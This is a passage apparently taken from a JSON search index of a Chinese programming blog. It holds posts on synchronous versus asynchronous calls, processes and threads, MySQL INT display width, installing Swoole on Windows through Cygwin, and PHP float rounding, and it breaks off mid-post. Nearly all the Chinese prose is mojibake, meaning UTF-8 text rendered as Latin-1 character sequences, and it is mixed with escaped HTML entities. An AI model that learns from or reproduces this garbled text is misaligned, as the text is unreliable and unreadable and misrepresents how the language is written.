æè¿°å¯¹è±¡æ˜¯è¢«è°ƒç”¨å¯¹è±¡çš„è¡Œä¸ºã€‚ åŒæ­¥ï¼šåœ¨å‘å‡ºä¸€ä¸ªåŒæ­¥è°ƒç”¨åï¼Œæ²¡æœ‰å¾—åˆ°ç»“æœè¿”å›ä¹‹å‰ï¼Œè¯¥è°ƒç”¨å°±ä¸ä¼šè¿”å›ï¼Œåªæœ‰ç­‰å¾…ç»“æœè¿”å›ä¹‹åæ‰ä¼šç»§ç»­æ‰§è¡Œåç»­æ“ä½œã€‚å¼‚æ­¥ï¼šå‘å‡ºè°ƒç”¨ï¼Œç›´æ¥è¿”å›ã€‚å¼‚æ­¥å¯ä»¥é€šè¿‡çŠ¶æ€ã€å›è°ƒã€é€šçŸ¥è°ƒç”¨è€…ç»“æœï¼Œå¯ä»¥å…ˆæ‰§è¡Œå…¶ä»–æ“ä½œï¼Œç›´åˆ°å›è°ƒç»“æœè¿”å›ä¹‹åï¼Œå†å›æ¥æ‰§è¡Œå›è°ƒé‚£éƒ¨åˆ†çš„æ“ä½œã€‚ é˜»å¡/éé˜»å¡é˜»å¡å’Œéé˜»å¡æ˜¯ä¸€ç§ä¸šåŠ¡æµç¨‹å¤„ç†æ–¹å¼ã€‚å…³æ³¨ç‚¹åœ¨äºè°ƒç”¨å‘ç”Ÿæ—¶ è°ƒç”¨è€…çŠ¶æ€ å’Œ è¢«è°ƒç”¨è€…è¿”å›ç»“æœ ä¹‹é—´çš„å…³ç³»ã€‚ æè¿°çš„æ˜¯ç­‰å¾…ç»“æœæ—¶å€™è°ƒç”¨è€…çš„çŠ¶æ€ã€‚ æ­¤æ—¶ç»“æœå¯èƒ½æ˜¯åŒæ­¥è¿”å›çš„ï¼Œä¹Ÿèƒ½æ˜¯å¼‚æ­¥è¿”å›ã€‚ é˜»å¡ï¼šåœ¨ç»“æœè¿”å›ä¹‹å‰ï¼Œè¯¥çº¿ç¨‹ä¼šè¢«æŒ‚èµ·ï¼Œåç»­ä»£ç åªæœ‰åœ¨ç»“æœè¿”å›åæ‰èƒ½æ‰§è¡Œã€‚éé˜»å¡ï¼šåœ¨ä¸èƒ½ç«‹åˆ»è·å–ç»“æœå‰ï¼Œè¯¥è°ƒç”¨ä¸ä¼šé˜»å¡å½“å‰çº¿ç¨‹ã€‚ åŒæ­¥é˜»å¡/éåŒæ­¥é˜»å¡å®é™…ç¼–ç¨‹ä¸­ï¼Œé€šè¿‡çº¿ç¨‹å®ç°è¿›ç¨‹çš„åŒæ­¥éé˜»å¡ï¼Œé€šè¿‡åç¨‹å®ç°çº¿ç¨‹çš„åŒæ­¥éé˜»å¡ã€‚ åŒæ­¥é˜»å¡ï¼šæ‰“ç”µè¯é—®è€æ¿æœ‰æ²¡æœ‰æŸä¹¦ï¼ˆè°ƒç”¨ï¼‰ï¼Œè€æ¿è¯´æŸ¥ä¸€ä¸‹ï¼Œè®©ä½ åˆ«æŒ‚ç”µè¯ï¼ˆåŒæ­¥ï¼‰ï¼Œä½ ä¸€ç›´ç­‰å¾…è€æ¿ç»™ä½ ç»“æœï¼Œä»€ä¹ˆäº‹ä¹Ÿä¸åšï¼ˆé˜»å¡ï¼‰ã€‚ åŒæ­¥éé˜»å¡ï¼šæ‰“ç”µè¯é—®è€æ¿æœ‰æ²¡æœ‰æŸä¹¦ï¼ˆè°ƒç”¨ï¼‰ï¼Œè€æ¿è¯´æŸ¥ä¸€ä¸‹ï¼Œè®©ä½ åˆ«æŒ‚ç”µè¯ï¼ˆåŒæ­¥ï¼‰ï¼Œç­‰ç”µè¯çš„è¿‡ç¨‹ä¸­ä½ è¿˜ä¸€è¾¹å—‘ç“œå­ï¼ˆéé˜»å¡ï¼‰ã€‚ å¼‚æ­¥é˜»å¡/å¼‚æ­¥éé˜»å¡å¼‚æ­¥é˜»å¡ï¼šæ‰“ç”µè¯é—®è€æ¿æœ‰æ²¡æœ‰æŸä¹¦ï¼ˆè°ƒç”¨ï¼‰ï¼Œè€æ¿è¯´ä½ å…ˆæŒ‚ç”µè¯ï¼Œæœ‰äº†ç»“æœé€šçŸ¥ä½ ï¼ˆå¼‚æ­¥ï¼‰ï¼Œä½ æŒ‚äº†ç”µè¯åï¼ˆç»“æŸè°ƒç”¨ï¼‰, é™¤äº†ç­‰è€æ¿ç”µè¯é€šçŸ¥ç»“æœï¼Œä»€ä¹ˆäº‹æƒ…ä¹Ÿä¸åšï¼ˆé˜»å¡ï¼‰ã€‚ å¼‚æ­¥éé˜»å¡ï¼šæ‰“ç”µè¯é—®è€æ¿æœ‰æ²¡æœ‰æŸä¹¦ï¼ˆè°ƒç”¨ï¼‰ï¼Œè€æ¿è¯´ä½ å…ˆæŒ‚ç”µè¯ï¼Œæœ‰äº†ç»“æœé€šçŸ¥ä½ ï¼ˆå¼‚æ­¥ï¼‰ï¼Œä½ æŒ‚ç”µè¯åï¼ˆç»“æŸè°ƒç”¨ï¼‰ï¼Œä¸€éç­‰ç”µè¯ï¼Œä¸€éå—‘ç“œå­ã€‚ï¼ˆéé˜»å¡ï¼‰ å‚è€ƒé“¾æ¥ Swoole ä¸­æ¶‰åŠçš„ä¸€äº›åŸºæœ¬æ¦‚å¿µ","categories":[{"name":"PHP","slug":"PHP","permalink":"https://www.0x2beace.com/categories/PHP/"}],"tags":[{"name":"PHP","slug":"PHP","permalink":"https://www.0x2beace.com/tags/PHP/"},{"name":"Swoole","slug":"Swoole","permalink":"https://www.0x2beace.com/tags/Swoole/"}]},{"title":"åˆå§‹è¿›ç¨‹ä¸çº¿ç¨‹","slug":"initial-process-and-thread","date":"2020-10-24T13:50:46.000Z","updated":"2020-10-24T13:53:41.808Z","comments":true,"path":"initial-process-and-thread/","link":"","permalink":"https://www.0x2beace.com/initial-process-and-thread/","excerpt":"å…³äºè¿›ç¨‹å’Œçº¿ç¨‹ï¼Œæ­¤å‰å·²ç»æœ‰å¾ˆå¤šä¼˜ç§€çš„æ–‡ç« äº†ï¼Œè¿™é‡Œåªæ˜¯æŠ›ç –å¼•ç‰ï¼ŒåŸºäºè‡ªå·±çš„ç†è§£å¹¶æ•´ç†åŠ æ·±å°è±¡ã€‚","text":"å…³äºè¿›ç¨‹å’Œçº¿ç¨‹ï¼Œæ­¤å‰å·²ç»æœ‰å¾ˆå¤šä¼˜ç§€çš„æ–‡ç« äº†ï¼Œè¿™é‡Œåªæ˜¯æŠ›ç –å¼•ç‰ï¼ŒåŸºäºè‡ªå·±çš„ç†è§£å¹¶æ•´ç†åŠ æ·±å°è±¡ã€‚ æ“ä½œç³»ç»Ÿä¸‹çš„è¿›ç¨‹ä¸çº¿ç¨‹åœ¨æ­£å¼ä»‹ç»è¿›ç¨‹å’Œçº¿ç¨‹ä¹‹å‰ï¼Œä»æ“ä½œç³»ç»Ÿçš„è§’åº¦äº†è§£ä¸€ä¸‹ã€‚ ä¼—æ‰€å‘¨çŸ¥ï¼Œç°ä»£çš„æ“ä½œç³»ç»Ÿï¼ˆMac OS Xï¼ŒUNIXï¼ŒLinuxï¼ŒWindowsç­‰ï¼‰éƒ½æ˜¯æ”¯æŒâ€œå¤šä»»åŠ¡â€çš„æ“ä½œç³»ç»Ÿã€‚ é‚£ä¹ˆä»€ä¹ˆæ˜¯â€œå¤šä»»åŠ¡â€å‘¢ï¼Ÿç®€å•çš„è¯´ï¼Œå¤šä»»åŠ¡å°±æ˜¯åŒæ—¶è¿è¡Œå¤šä¸ªä»»åŠ¡ï¼Œæ¯”å¦‚ä¸€è¾¹å¬æ­Œï¼Œä¸€è¾¹å†™åšå®¢ã€‚ å¤šæ ¸ CPUå¯ä»¥ç›´æ¥åŒæ—¶è¿è¡Œå¤šä¸ªä»»åŠ¡ï¼Œè€Œå¯¹äºå•æ ¸ CPU æ¥è¯´ï¼Œåªèƒ½è®©ç³»ç»Ÿè½®æµæ‰§è¡Œæ¯ä¸ªä»»åŠ¡ï¼Œå› ä¸ºä»»åŠ¡ä¹‹é—´åˆ‡æ¢å¾ˆå¿«ï¼Œåœ¨å®è§‚ä¸Šçœ‹ä¸Šå»å°±æ˜¯åŒæ—¶æ‰§è¡Œçš„äº†ã€‚ å¯¹äºæ“ä½œç³»ç»Ÿæ¥è¯´ï¼Œä¸€ä¸ªä»»åŠ¡å°±æ˜¯ä¸€ä¸ªè¿›ç¨‹ã€‚è€Œæœ‰çš„è¿›ç¨‹åŒæ—¶åšå‡ ä»¶äº‹æƒ…ï¼Œä¹Ÿå°±æ˜¯åŒæ—¶è¿è¡Œå¤šä¸ªå­ä»»åŠ¡ï¼Œæˆ‘ä»¬æŠŠè¿›ç¨‹å†…çš„è¿™ç±»å­ä»»åŠ¡ç§°ä¸ºçº¿ç¨‹ã€‚ ç”±äºæ¯ä¸ªè¿›ç¨‹è‡³å°‘è¦å¹²ä¸€ä»¶äº‹æƒ…ï¼Œæ‰€ä»¥ï¼Œä¸€ä¸ªè¿›ç¨‹è‡³å°‘æœ‰ä¸€ä¸ªçº¿ç¨‹ã€‚ PHP é»˜è®¤æ˜¯æ‰§è¡Œå•ä»»åŠ¡çš„è¿›ç¨‹ï¼Œä¹Ÿå°±æ˜¯åªæœ‰ä¸€ä¸ªçº¿ç¨‹ã€‚å¦‚æœæˆ‘ä»¬è¦åŒæ—¶æ‰§è¡Œå¤šä¸ªä»»åŠ¡æ€ä¹ˆåŠï¼Ÿ æœ‰ä¸¤ç§è§£å†³æ–¹æ¡ˆï¼š å¯åŠ¨å¤šä¸ªè¿›ç¨‹ï¼Œæ¯ä¸ªè¿›ç¨‹è™½ç„¶åªæœ‰ä¸€ä¸ªçº¿ç¨‹ï¼Œä½†å¤šä¸ªè¿›ç¨‹å¯ä»¥ä¸€å—æ‰§è¡Œå¤šä¸ªä»»åŠ¡ã€‚ å¯åŠ¨ä¸€ä¸ªè¿›ç¨‹ï¼Œåœ¨ä¸€ä¸ªè¿›ç¨‹å†…å¯åŠ¨å¤šä¸ªçº¿ç¨‹ï¼Œè¿™æ ·ï¼Œå¤šä¸ªçº¿ç¨‹ä¹Ÿå¯ä»¥ä¸€å—æ‰§è¡Œå¤šä¸ªä»»åŠ¡ã€‚ å¤šçº¿ç¨‹çº¿ç¨‹æ˜¯æœ€å°çš„æ‰§è¡Œå•å…ƒï¼Œè€Œè¿›ç¨‹ç”±è‡³å°‘ä¸€ä¸ªçº¿ç¨‹ç»„æˆï¼ŒçŸ¥é“è¿™ä¸€ç‚¹åï¼Œå†æ¥ç†è§£å¤šçº¿ç¨‹å°±ä¸éš¾äº†ã€‚ å¤šçº¿ç¨‹å°±æ˜¯æŒ‡ä¸€ä¸ªè¿›ç¨‹ä¸­åŒæ—¶æœ‰å¤šä¸ªçº¿ç¨‹æ­£åœ¨æ‰§è¡Œã€‚ ä¸ºä»€ä¹ˆè¦ä½¿ç”¨å¤šçº¿ç¨‹ï¼Ÿå¯¹äºä¸€ä¸ªç¨‹åºæ¥è¯´ï¼Œå¾ˆå¤šæ“ä½œäº‹éå¸¸è€—æ—¶çš„ï¼Œå¦‚æ•°æ®åº“I/Oæ“ä½œã€æ–‡ä»¶è¯»å†™ç­‰ã€‚å¦‚æœä½¿ç”¨å•çº¿ç¨‹ï¼Œé‚£ä¹ˆå°±åªèƒ½ç­‰å¾…è¯¥çº¿ç¨‹å¤„ç†å®Œè¿™äº›æ“ä½œä¹‹åï¼Œæ‰èƒ½ç»§ç»­å¾€ä¸‹æ‰§è¡Œå…¶ä»–æ“ä½œã€‚ è€Œå¦‚æœä½¿ç”¨å¤šçº¿ç¨‹ï¼Œå°±å¯ä»¥å°†è€—æ—¶çš„é‚£éƒ¨åˆ†æ“ä½œé€šè¿‡å…¶ä»–çº¿ç¨‹å»æ‰§è¡Œï¼Œä»è€Œæé«˜ç¨‹åºæ‰§è¡Œæ•ˆç‡ã€‚ å¤šçº¿ç¨‹çš„ç¼ºç‚¹ ä½¿ç”¨è¿‡å¤šçº¿ç¨‹ä¼šè¿‡åº¦æ¶ˆè€—ç³»ç»Ÿèµ„æºï¼Œå› ä¸ºåˆ›å»ºçº¿ç¨‹éœ€è¦å¼€è¾Ÿæ–°çš„å†…å­˜ã€‚ å½±å“ç³»ç»Ÿæ€§èƒ½ï¼Œæ“ä½œç³»ç»Ÿéœ€è¦æ¥å›å¯¹å¤šçº¿ç¨‹è¿›è¡Œåˆ‡æ¢ã€‚ åŒæ—¶è¿˜éœ€è¦è€ƒè™‘çº¿ç¨‹å¼‚å¸¸ï¼ˆæŒ‚èµ·ã€ä¸­æ­¢ï¼‰æ—¶å¯èƒ½ä¼šå¯¹é€ æˆç¨‹åºçš„å½±å“ã€‚ æ€»ç»“ï¼šå¤šçº¿ç¨‹æ˜¯å¼‚æ­¥çš„ï¼Œåˆ†åˆ«åˆ›å»ºN ä¸ªçº¿ç¨‹å¹¶ä¸èƒ½è¯´æ˜ä»–ä»¬å°±æ˜¯åœ¨åŒæ—¶è¿è¡Œï¼Œå®é™…ä¸Šæ˜¯æ“ä½œç³»ç»Ÿåœ¨å„ä¸ªçº¿ç¨‹ä¹‹é—´æ¥å›åˆ‡æ¢ï¼Œå¹¶ä¸”åˆ‡æ¢é€Ÿåº¦éå¸¸å¿«ï¼Œè¿™ä¹Ÿå°±é€ æˆäº†åœ¨å®è§‚ä¸Šç»™æˆ‘ä»¬åŒæ—¶è¿è¡Œçš„é”™è§‰ã€‚ å¤šè¿›ç¨‹å¤šè¿›ç¨‹å°±æ˜¯æŒ‡è®¡ç®—æœºåŒæ—¶æ‰§è¡Œå¤šä¸ªè¿›ç¨‹ã€‚ å¤šè¿›ç¨‹è¿˜æ˜¯å¤šçº¿ç¨‹ä¸‹é¢å¼•ç”¨ä¸€ä¸ªçŸ¥ä¹ä¸Šçš„å›ç­”ï¼Œéå¸¸é€šä¿—çš„è§£é‡Šäº†é€‰æ‹©å¤šè¿›ç¨‹è¿˜æ˜¯å¤šçº¿ç¨‹çš„é—®é¢˜ã€‚ å•è¿›ç¨‹å•çº¿ç¨‹ï¼šä¸€ä¸ªäººåœ¨ä¸€ä¸ªæ¡Œå­ä¸Šåƒèœã€‚ å•è¿›ç¨‹å¤šçº¿ç¨‹ï¼šå¤šä¸ªäººåœ¨åŒä¸€ä¸ªæ¡Œå­ä¸Šä¸€èµ·åƒèœã€‚ å¤šè¿›ç¨‹å•çº¿ç¨‹ï¼šå¤šä¸ªäººæ¯ä¸ªäººåœ¨è‡ªå·±çš„æ¡Œå­ä¸Šåƒèœã€‚ å¤šçº¿ç¨‹çš„é—®é¢˜æ˜¯å¤šä¸ªäººåŒæ—¶åƒä¸€é“èœçš„æ—¶å€™å®¹å™¨å‘ç”Ÿäº‰æŠ¢ã€‚ä¾‹å¦‚ä¸¤ä¸ªäººåŒæ—¶å¤¹ä¸€ä¸ªèœï¼Œä¸€ä¸ªäººåˆšä¼¸å‡ºç­·å­ï¼Œç»“æœä¼¸åˆ°çš„æ—¶å€™èœå·²ç»è¢«å¤¹èµ°äº†ã€‚é€šä¿—ç‚¹è¯´ä¹Ÿå°±è¯´èµ„æºå…±äº«å®¹å™¨å‘ç”Ÿå†²çªäº‰æŠ¢ã€‚ å¯¹äºWindows ç³»ç»Ÿæ¥è¯´ï¼Œâ€œå¼€æ¡Œå­â€çš„å¼€é”€å¾ˆå¤§ï¼Œå› æ­¤Windows é¼“åŠ±å¤§å®¶åœ¨ä¸€ä¸ªæ¡Œå­ä¸Šåƒèœã€‚å› æ­¤ Windows å¤šçº¿ç¨‹çš„å­¦ä¹ é‡ç‚¹æ˜¯èµ„æºäº‰æŠ¢ä¸åŒæ­¥æ–¹é¢çš„é—®é¢˜ã€‚ è€Œå¯¹äºLinux ç³»ç»Ÿæ¥è¯´ï¼Œâ€œå¼€æ¡Œå­â€çš„å¼€é”€å¾ˆå°ï¼Œå› ä¸ºLinux é¼“åŠ±å¤§å®¶å°½é‡æ¯ä¸ªäººéƒ½å¼€è‡ªå·±çš„æ¡Œå­åƒèœã€‚ä½†è¿™åŒäº‹ä¹Ÿå¸¦æ¥äº†æ–°çš„é—®é¢˜ï¼šä¸¤ä¸ªäººååœ¨ä¸åŒçš„æ¡Œå­ä¸Šï¼Œè¯´è¯ä¸æ–¹ä¾¿ã€‚å› ä¸ºï¼ŒLinux å¤šçº¿ç¨‹çš„å­¦ä¹ é‡ç‚¹æ˜¯è¿›ç¨‹ä¹‹é—´çš„é€šè®¯æ–¹å¼ã€‚ å‚è€ƒé“¾æ¥ è¿›ç¨‹å’Œçº¿ç¨‹ å¤šè¿›ç¨‹å’Œå¤šçº¿ç¨‹çš„æ¦‚å¿µ å¤šçº¿ç¨‹æœ‰ä»€ä¹ˆç”¨ï¼Ÿâ€”â€”çŸ¥ä¹","categories":[{"name":"PHP","slug":"PHP","permalink":"https://www.0x2beace.com/categories/PHP/"}],"tags":[{"name":"PHP","slug":"PHP","permalink":"https://www.0x2beace.com/tags/PHP/"},{"name":"è¿›ç¨‹","slug":"è¿›ç¨‹","permalink":"https://www.0x2beace.com/tags/%E8%BF%9B%E7%A8%8B/"},{"name":"çº¿ç¨‹","slug":"çº¿ç¨‹","permalink":"https://www.0x2beace.com/tags/%E7%BA%BF%E7%A8%8B/"}]},{"title":"MySQL Integerç±»å‹ä¸INT(11)è¯¦è§£","slug":"mysql-integer-type-and-int-11-detailed-explanation","date":"2020-10-23T10:39:10.000Z","updated":"2020-10-23T10:39:49.036Z","comments":true,"path":"mysql-integer-type-and-int-11-detailed-explanation/","link":"","permalink":"https://www.0x2beace.com/mysql-integer-type-and-int-11-detailed-explanation/","excerpt":"MySQLæ”¯æŒçš„æ•´æ•°ç±»å‹æœ‰TINYINTã€SMALLINTã€MEDIUMINTã€INTã€BIGINTã€‚","text":"MySQLæ”¯æŒçš„æ•´æ•°ç±»å‹æœ‰TINYINTã€SMALLINTã€MEDIUMINTã€INTã€BIGINTã€‚ æ¯ç§æ•´æ•°ç±»å‹æ‰€éœ€çš„å­˜å‚¨ç©ºé—´å’ŒèŒƒå›´å¦‚ä¸‹ï¼š|ç±»å‹|å­—èŠ‚|æœ€å°å€¼(æœ‰ç¬¦å·)|æœ€å¤§å€¼(æœ‰ç¬¦å·)|æœ€å°å€¼(æ— ç¬¦å·)|æœ€å¤§å€¼(æ— ç¬¦å·)||-|-|-|-|-|-||TINYINT|1|-128|127|0|255||SMALLINT|2|-32768|32767|0|65535||MEDIUMINT|3|-8388608|8388607|0|16777215||INT|4|-2147483648|2147483647|0|4294967295||BIGINT|8|-9223372036854775808|(9223372036854775807|0|18446744073709551615| æœ‰æ— é™åˆ¶çš„åŒºåˆ«åœ¨åˆ›å»ºæ•°æ®è¡¨æ—¶ï¼Œé€šå¸¸ä¼šçœ‹è§ int(11)å’Œintè¿™æ ·çš„å†™æ³•ï¼Œè¿™ä¸¤è€…æœ‰ä»€ä¹ˆåŒºåˆ«ï¼Œå„è‡ªåˆä»£è¡¨ä»€ä¹ˆæ„æ€å‘¢ï¼Ÿ å¯¹åº”Integer ç±»å‹è€Œè¨€ï¼Œä»…è¡¨ç¤ºå­—æ®µçš„æ˜¾ç¤ºå®½åº¦ã€‚ å¯¹äºDECIMALç±»å‹ï¼Œè¡¨ç¤ºæ•°å­—çš„æ€»æ•°ã€‚ å¯¹äºå­—ç¬¦å­—æ®µï¼Œè¿™æ˜¯å¯ä»¥å­˜å‚¨çš„æœ€å¤§å­—ç¬¦æ•°ï¼Œä¾‹å¦‚VARCHARï¼ˆ20ï¼‰å¯ä»¥å­˜å‚¨20ä¸ªå­—ç¬¦ã€‚ æ˜¾ç¤ºå®½åº¦å¹¶ä¸å½±å“å¯ä»¥å­˜å‚¨åœ¨è¯¥åˆ—ä¸­çš„æœ€å¤§å€¼ã€‚int(3)å’Œint(11) æ‰€èƒ½å­˜å‚¨çš„æœ€å¤§èŒƒå›´æ˜¯ä¸€æ ·çš„ã€‚ å°†æŸä¸ªå­—æ®µè®¾ç½®æˆINT(20)å¹¶ä¸æ„å‘³ç€å°†èƒ½å¤Ÿå­˜å‚¨20ä½æ•°å­—ï¼Œè¿™ä¸ªå­—æ®µæœ€ç»ˆèƒ½å­˜å‚¨çš„æœ€å¤§èŒƒå›´è¿˜æ˜¯ INT çš„èŒƒå›´ã€‚ ç¤ºä¾‹åˆ›å»ºä¸€å¼ ä¸´æ—¶è¡¨ï¼š 12345CREATE TABLE tmp_table_a ( id INT(3) NOT NULL AUTO_INCREMENT, name varchar(16) DEFAULT &#39;&#39; NOT NULL, PRIMARY KEY (&#96;id&#96;)); æŸ¥çœ‹è¡¨ç»“æ„ï¼š 1234567mysql&gt; desc tmp_table_a;+-------+-------------+------+-----+---------+----------------+| Field | Type | Null | Key | Default | Extra |+-------+-------------+------+-----+---------+----------------+| id | int(3) | NO | PRI | NULL | auto_increment || name | varchar(16) | NO | | | |+-------+-------------+------+-----+---------+----------------+ æ’å…¥è¶…è¿‡â€é•¿åº¦â€çš„æ•°å­—ï¼š 1INSERT INTO tmp_table_a(id, name) VALUES(123456, &quot;boo&quot;); æŸ¥çœ‹ç»“æœï¼Œå‘ç°æ•°å­—å¹¶æ²¡æœ‰æ’å…¥å¤±è´¥ï¼š 1234567mysql&gt; select * from tmp_table_a;+--------+------+| id | name |+--------+------+| 123456 | boo |+--------+------+1 row in set (0.00 sec) æœ‰æ— ç¬¦å·çš„åŒºåˆ«é‚£ä¹ˆé—®é¢˜æ¥äº†ï¼Œæ—¢ç„¶åŠ ä¸åŠ æ•°å­—å¹¶æ²¡æœ‰ä»€ä¹ˆåŒºåˆ«ï¼Œé‚£ä¸ºä»€ä¹ˆè¿˜å¤šæ­¤ä¸€ä¸¾å‘¢ï¼Ÿ è¿™æ˜¯å› ä¸ºâ€œæ­£å¸¸â€æƒ…å†µä¸‹ç¡®å®æ²¡æœ‰ä»€ä¹ˆåŒºåˆ«ï¼Œåªæœ‰å½“å­—æ®µè®¾ç½®ä¸ºUNSIGNED ZEROFILL å±æ€§æ—¶ï¼Œä¸ºINT å¢åŠ æ•°å­—æ‰ä¼šæœ‰æ„ä¹‰ã€‚ è¡¨ç¤ºå¦‚æœè¦å­˜å‚¨çš„æ•°å­—å°‘äºN ä¸ªå­—ç¬¦ï¼Œåˆ™è¿™äº›æ•°å­—å°†åœ¨å·¦ä¾§è¡¥é›¶ã€‚ ç¤ºä¾‹åˆ›å»ºä¸€å¼  UNSIGNED ZEROFILL çš„æ•°æ®è¡¨ï¼š 12345CREATE TABLE tmp_table_b ( id INT(3) UNSIGNED ZEROFILL NOT NULL AUTO_INCREMENT, name varchar(16) DEFAULT &#39;&#39; NOT NULL, PRIMARY KEY (&#96;id&#96;)); æŸ¥çœ‹è¡¨ç»“æ„ï¼š 1234567mysql&gt; desc tmp_table_b;+-------+--------------------------+------+-----+---------+----------------+| Field | Type | Null | Key | Default | Extra |+-------+--------------------------+------+-----+---------+----------------+| id | int(3) unsigned zerofill | NO | PRI | NULL | auto_increment || name | varchar(16) | NO | | | |+-------+--------------------------+------+-----+---------+----------------+ æ’å…¥è®°å½•ï¼š 1INSERT INTO tmp_table_b(id, name) VALUES(1, &quot;boo&quot;); æŸ¥çœ‹è®°å½•ï¼š 123456mysql&gt; select * from tmp_table_b;+-----+------+| id | name |+-----+------+| 001 | boo |+-----+------+ æ€»ç»“ å¯¹äºInteger ç±»å‹è€Œè¨€ï¼Œâ€œæ•°å­—â€å¹¶ä¸ä¼šé™åˆ¶å…¶èƒ½å­˜å‚¨çš„æœ€å¤§èŒƒå›´ã€‚ æœ‰æ— ç¬¦å·ï¼Œä¸ä»…ä¼šé™åˆ¶å…¶èƒ½å­˜å‚¨çš„æœ€å¤§èŒƒå›´ï¼Œè¿˜å¯ä»¥é…ç½®â€œæ•°å­—â€è‡ªåŠ¨è¡¥é›¶ã€‚ å‚è€ƒé“¾æ¥ MySQL Integerç±»å‹ä¸INT(11)","categories":[{"name":"Mysql","slug":"Mysql","permalink":"https://www.0x2beace.com/categories/Mysql/"}],"tags":[{"name":"Mysql","slug":"Mysql","permalink":"https://www.0x2beace.com/tags/Mysql/"}]},{"title":"Windows å¦‚ä½•å®‰è£… Swooleï¼Ÿ","slug":"how-to-install-swoole-on-windows","date":"2020-10-21T11:56:53.000Z","updated":"2020-11-26T10:19:33.578Z","comments":true,"path":"how-to-install-swoole-on-windows/","link":"","permalink":"https://www.0x2beace.com/how-to-install-swoole-on-windows/","excerpt":"Swoole æ˜¯ä¸€ä¸ª PHP çš„åç¨‹é«˜æ€§èƒ½ç½‘ç»œé€šä¿¡å¼•æ“ã€‚","text":"Swoole æ˜¯ä¸€ä¸ª PHP çš„åç¨‹é«˜æ€§èƒ½ç½‘ç»œé€šä¿¡å¼•æ“ã€‚ ç›®å‰ä»…æ”¯æŒ Linux(2.3.32 ä»¥ä¸Šå†…æ ¸)ã€FreeBSDã€MacOS ä¸‰ç§æ“ä½œç³»ç»Ÿï¼Œå®ƒå¹¶ä¸æ”¯æŒç›´æ¥åœ¨ Windows ä¸‹å®‰è£…ï¼Œå› ä¸ºWindows ç³»ç»Ÿé»˜è®¤æ²¡æœ‰ä»¥ä¸‹è½¯ä»¶ï¼š gcc-4.8 æˆ–æ›´é«˜ç‰ˆæœ¬ make autoconf å¦‚æœä¸€å®šè¦åœ¨Windows ç³»ç»Ÿä¸­ä½¿ç”¨ï¼Œåˆ™å¯ä»¥ä½¿ç”¨ CygWin æˆ– WSL(Windows Subsystem for Linux) ã€‚ è¿™ç¯‡ç¬”è®°å¹¶ä¸ä»‹ç»å¦‚ä½•åœ¨Windows ç³»ç»Ÿä¸­ï¼Œå®‰è£…Cygwinï¼Œå¦‚æœéœ€è¦ï¼Œå¯ä»¥å‚è€ƒCygwin å¿«é€Ÿä¸Šæ‰‹ ã€‚ éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œåœ¨å®‰è£…Cygwin æ—¶ï¼Œè®°å¾—å‹¾é€‰ä»¥ä¸‹è½¯ä»¶åŒ…ï¼š gccã€gcc++ autoconf php-devel pcre2 å®‰è£…Swoole1. å¯ä»¥é€šè¿‡ä»¥ä¸‹æ–¹å¼ä¸‹è½½ Swoole github pecl gitee 2. ä»æºç ç¼–è¯‘å®‰è£…ä¸‹è½½æºä»£ç åŒ…åï¼Œå°†å…¶æ‹·è´è‡³ Cygwin çš„home ç›®å½•ï¼Œè§£å‹å¹¶è¿›å…¥æ–‡ä»¶å¤¹ã€‚ 1tar -zxvf swoole-src.tgz ç¼–è¯‘å®‰è£…ï¼š 1234cd swoole-src &amp;&amp; \\phpize &amp;&amp; \\.&#x2F;configure &amp;&amp; \\make &amp;&amp; sudo make install å¦‚æœå› ä¸ºæŸä¸ªè½¯ä»¶åŒ…ç¼ºå¤±è€Œå¯¼è‡´ç¼–è¯‘å®‰è£…å¤±è´¥ï¼Œåˆ™å¯ä»¥é‡æ–°å®‰è£… Cygwinï¼ˆé‡æ–°å®‰è£…ä¸ç”¨å¸è½½ä¹‹é—´çš„ç‰ˆæœ¬ï¼Œç›´æ¥åœ¨æ­¤å®‰è£…å°±å¥½äº†ï¼‰ã€‚ 3. å¯ç”¨æ‰©å±•ç¼–è¯‘å®‰è£…åˆ°ç³»ç»ŸæˆåŠŸåï¼Œéœ€è¦åœ¨ php.ini ä¸­åŠ å…¥ä¸€è¡Œ extension=swoole.so æ¥å¯ç”¨ Swoole æ‰©å±•ã€‚ éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œé€šè¿‡è¿™ç§æ–¹å¼å®‰è£…çš„Swooleï¼Œæœ€ç»ˆå­˜åœ¨äºCygwin ç¯å¢ƒä¸­ï¼Œä¸å®¿ä¸»æœºä¸­çš„PHP ç‰ˆæœ¬æ— å…³ã€‚ é€šè¿‡php -m | grep swooleæŸ¥çœ‹æ˜¯å¦å®‰è£…æˆåŠŸã€‚","categories":[{"name":"PHP","slug":"PHP","permalink":"https://www.0x2beace.com/categories/PHP/"}],"tags":[{"name":"PHP","slug":"PHP","permalink":"https://www.0x2beace.com/tags/PHP/"},{"name":"Cygwin","slug":"Cygwin","permalink":"https://www.0x2beace.com/tags/Cygwin/"},{"name":"Windows","slug":"Windows","permalink":"https://www.0x2beace.com/tags/Windows/"},{"name":"Swoole","slug":"Swoole","permalink":"https://www.0x2beace.com/tags/Swoole/"}]},{"title":"PHP å¸¸è§æµ®ç‚¹æ•°æ“ä½œ","slug":"php-common-floating-point-operations","date":"2020-10-20T11:24:23.000Z","updated":"2020-10-20T11:35:47.611Z","comments":true,"path":"php-common-floating-point-operations/","link":"","permalink":"https://www.0x2beace.com/php-common-floating-point-operations/","excerpt":"æµ®ç‚¹æ•°æ“ä½œåœ¨å®é™…åº”ç”¨ä¸­è¿˜æ˜¯æŒºå¤šçš„ï¼Œè¿™ç¯‡ç¬”è®°ç”¨æ¥æ•´ç†å¸¸è§æ“ä½œã€‚","text":"æµ®ç‚¹æ•°æ“ä½œåœ¨å®é™…åº”ç”¨ä¸­è¿˜æ˜¯æŒºå¤šçš„ï¼Œè¿™ç¯‡ç¬”è®°ç”¨æ¥æ•´ç†å¸¸è§æ“ä½œã€‚ ä¿ç•™Nä½å°æ•°åšå››èˆäº”å…¥æƒ³è¦ä¿ç•™N ä½å°æ•°åŒæ—¶åšå››èˆäº”å…¥çš„æ–¹å¼è¿˜æ˜¯æŒºå¤šçš„ï¼Œä¸‹é¢åˆ—ä¸¾å¸¸ç”¨çš„å‡ ç§ã€‚ sprintfsprintf å‡½æ•°ç”¨äºè¿”å›ä¸€ä¸ªæ ¼å¼åŒ–ä¹‹åçš„å­—ç¬¦ä¸²ã€‚ 123&lt;?php$num &#x3D; 22.356;echo sprintf(&quot;%.2f&quot;, $num); &#x2F;&#x2F; 22.36 %.2f æ˜¯ç›®æ ‡æ 